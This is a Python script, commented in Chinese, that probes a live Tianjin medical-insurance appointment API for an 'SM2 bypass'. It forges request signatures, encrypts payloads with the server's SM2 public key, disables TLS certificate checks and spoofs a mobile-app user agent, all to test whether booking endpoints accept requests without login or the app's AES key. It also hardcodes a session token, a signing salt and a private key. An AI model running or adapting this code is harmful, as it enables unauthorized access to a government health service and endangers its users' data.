"""SM2 旁路可行性 live 探测：
向预约接口发 SM2 加密的「无效参数」请求（缺关键字段，服务端只会校验报错，不会真正预约）。
若响应是 SM2 密文且能用客户端私钥解密 => 预约接口接受 SM2 => 无需 aesKey/登录。
"""
import os, time, random, string, hashlib, json, ssl, urllib.request
import sm2_dec as m

SRV_PUB = (0x650dd64bda01cd29a03c09792080ea855d783c79e774508ed8bf0a1618aed206,
           0x38966f2095bb8e9ff1f083f4cba1ccc60c32a34e95af3e6cf5ef397760470461)
PRIV = "ec7512f9799598e558446c25b9d0c376495ab6dcf57edd602228b15f7ba050"
TOKEN = "TJSYAPP_TOKEN_ALIAS_3065cec1-d630-485d-a36b-7cab091b8e98"
SALT = "jyb4443"
BASE = "https://jyt.ylbz.tj.gov.cn"

def sm2_encrypt(plain, pub, mode=1):
    if isinstance(plain, str): plain = plain.encode()
    x, y = pub
    while True:
        k = int.from_bytes(os.urandom(32), 'big') % (m.N-1) + 1
        x1, y1 = m.pt_mul(k, (m.GX, m.GY))
        x2, y2 = m.pt_mul(k, (x, y))
        x2b, y2b = x2.to_bytes(32,'big'), y2.to_bytes(32,'big')
        t = m.kdf(x2b+y2b, len(plain))
        if any(t): break
    C2 = bytes(a^b for a,b in zip(plain, t))
    C3 = m.sm3(x2b+plain+y2b)
    C1 = b'\x04'+x1.to_bytes(32,'big')+y1.to_bytes(32,'big')
    return (C1+C3+C2).hex() if mode==1 else (C1+C2+C3).hex()

def nonce(): return ''.join(random.choices(string.ascii_lowercase+string.digits, k=10))

def probe(path, payload_obj):
    ts = str(int(time.time()))
    nc = nonce()
    jyb = hashlib.md5((ts+nc+TOKEN+SALT).encode()).hexdigest()
    xt  = hashlib.sha256((ts+nc+ts).encode()).hexdigest().upper()
    body = "04" + sm2_encrypt(json.dumps(payload_obj, ensure_ascii=False), SRV_PUB)
    headers = {
        "token": TOKEN,
        "jyb-timestamp": ts, "jyb-nonce": nc, "jyb-signature": jyb,
        "X-Tif-Timestamp": ts, "X-Tif-Nonce": nc, "X-Tif-Signature": xt,
        "X-Tif-Paasid": "jyt_test",
        "dataSouc": "1",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MDLIFE/2.0",
        "Origin": "https://jyt.ylbz.tj.gov.cn:4443",
        "Referer": "https://jyt.ylbz.tj.gov.cn:4443/",
    }
    req = urllib.request.Request(BASE+path, data=body.encode(), headers=headers, method="POST")
    ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    try:
        r = urllib.request.urlopen(req, timeout=25, context=ctx)
        raw = r.read().decode(errors="replace"); code=r.status
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors="replace"); code=e.code
    except Exception as e:
        print(f"  请求异常: {e}"); return
    print(f"  HTTP {code}, 响应长度 {len(raw)}, 前缀 {raw[:8]!r}")
    # 尝试 SM2 解密
    cand = raw.strip()
    if cand.startswith('"'): cand = cand.strip('"')
    if cand.startswith("04"):
        try:
            pt, ok = m.sm2_decrypt(cand, PRIV, 1)
            print(f"  >>> SM2 可解密! C3校验:{ok} 明文: {pt.decode(errors='replace')[:300]}")
            return True
        except Exception as e:
            print(f"  SM2 解密失败: {e}")
    else:
        print(f"  响应非 04-hex（可能 AES/明文/HTML）: {raw[:120]!r}")
    return False

if __name__ == "__main__":
    print("== 探测1: 预约接口(无效参数,不会真正预约) ==")
    probe("/app-prod/med/otp/ordr/sbmtOrdrRgst", {"dataSouc":"1","probe":"1"})
    print("\n== 探测2: 通用查询接口 ==")
    probe("/app-prod/med/otp/comm/quryDisabledInfo", {})
